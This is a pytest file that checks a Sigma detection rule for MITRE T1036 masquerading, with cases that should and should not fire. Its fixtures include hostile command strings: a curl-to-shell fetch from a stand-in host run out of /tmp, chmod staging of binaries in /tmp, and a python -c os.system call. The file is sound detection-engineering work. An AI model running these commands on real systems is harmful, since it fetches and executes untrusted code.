"""Tests for the T1036 Masquerading Sigma rule.

Lives in server/rules/builtin/mitre_attack/T1036_masquerading.yml
and is exercised end-to-end through SigmaRuleRunner.

Covers:
- Interpreter with -c from world-writable tmpfs            → fires
- Dropper with double extension (.sh.py)                  → fires
- Process invoked from /tmp outside system paths          → fires
- Case-twist /bin/BASH (not /usr/bin/bash)                → fires
- chmod +x on /tmp followed by exec                       → fires
- /var/tmp + python -c                                   → fires
- Filter legit: apt install /usr/bin/bash                  → does NOT fire
- Substring trap: `bashbug` (process) must NOT match      → no fire
- Substring trap: `python3.10` (process) must NOT match   → no fire
- Substring trap: `/usr/bin/bash` must NOT match tmp rule → no fire
- Filter legit: systemd --user respawn                    → does NOT fire
"""
from __future__ import annotations

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest

from tests.fake_redis import FakeRedis
from zaqorincore_server.detectors.base import ParsedEvent
from zaqorincore_server.rule_engine.runner import SigmaRuleRunner
from zaqorincore_server.rule_engine.sigma import load_rules_from_dir

RULE_ID = "081e8ad0-6a92-4e37-9160-af96e69e8bbe"


def _rules() -> list:
    return load_rules_from_dir(Path("rules/builtin/mitre_attack"))


def _find(rules: list):
    return next(r for r in rules if r.id == RULE_ID)


def _event(process: str, command: str, **md) -> ParsedEvent:
    meta = {
        "event_type": "process_create",
        "process": process,
        "command": command,
        "user": "alice",
    }
    meta.update(md)
    return ParsedEvent(
        event_id=uuid.uuid4(),
        host_id=uuid.uuid4(),
        source="linux.audit.execve",
        raw="",
        metadata=meta,
        occurred_at=datetime.now(timezone.utc),
    )


@pytest.mark.asyncio
async def test_interpreter_minus_c_from_tmp_fires() -> None:
    """Classic dropper: `bash -c ...` invoked from /tmp."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/tmp/payload",
            "/tmp/payload bash -c 'curl http://x.example/x | sh'",
        )
    )
    assert len(fires) == 1
    assert fires[0].rule.id == RULE_ID


@pytest.mark.asyncio
async def test_double_extension_sh_py_fires() -> None:
    """Dropper lure: payload.sh.py — double interpreter extension."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/home/alice/invoice.sh.py",
            "/home/alice/invoice.sh.py",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_python_minus_c_from_var_tmp_fires() -> None:
    """python -c payload from /var/tmp — staged exec."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/var/tmp/loader",
            "/var/tmp/loader python3 -c 'import os; os.system(\"id\")'",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_case_twist_uppercase_bin_bash_fires() -> None:
    """`/bin/BASH` is NOT the system bash — argv is case-sensitive.

    Fires on `/bin/BASH` (all-caps basename, ≥3 letters) but not on
    `/bin/bash` (lowercase). Case-twist only applies to fully-uppercase
    basenames ≥3 chars, NOT to PascalCase like `SystemD` (deferred)."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/BASH", "/bin/BASH -c 'whoami'")
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_chmod_plus_x_tmp_then_exec_fires() -> None:
    """chmod +x on /tmp/<bin> then immediate exec."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/chmod",
            "chmod +x /tmp/x; /tmp/x",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_chmod_777_tmp_fires() -> None:
    """chmod 777 on /tmp/ — staging the dropper."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/chmod",
            "chmod 0777 /tmp/runme",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_filter_legit_apt_install_does_not_fire() -> None:
    """Package manager dropping a real bash binary should NOT trigger."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/dpkg",
            "dpkg -i /var/cache/apt/archives/bash_5.1.deb",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_filter_legit_systemd_user_respawn_does_not_fire() -> None:
    """systemd --user self-respawn is routine — must NOT trigger."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/lib/systemd/systemd",
            "systemd --user",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_substring_bashbug_does_not_match() -> None:
    """Substring trap: `bashbug` (process) must NOT match the
    `\\bbash\\b` selector — the regex requires `bash` to be a
    whole word. bashbug is the bash debug helper, totally benign."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/bashbug", "bashbug")
    )
    assert fires == []


@pytest.mark.asyncio
async def test_substring_python3_10_does_not_match_bare_python() -> None:
    """Substring trap: `python3.10` must NOT match the bare
    `python3` selector used by the /tmp path rule. python3.10 is
    a normal interpreter shipped by Debian."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/python3.10", "python3.10 -c 'print(1)'")
    )
    assert fires == []


@pytest.mark.asyncio
async def test_usr_bin_bash_does_not_match_tmp_path_rule() -> None:
    """Substring trap: `/usr/bin/bash` must NOT trigger the
    `/tmp|var/tmp|dev/shm` path rule — anchors on `^` and
    `/<dir>/<binary>` shape."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/bash", "/usr/bin/bash")
    )
    assert fires == []